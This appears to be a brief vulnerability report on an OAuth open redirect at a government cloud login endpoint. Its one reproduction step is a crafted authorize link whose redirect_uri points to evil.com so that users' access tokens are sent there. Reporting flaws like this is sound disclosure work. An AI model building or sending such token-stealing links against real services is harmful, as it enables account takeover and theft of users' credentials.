I found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.

Step : 
1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███
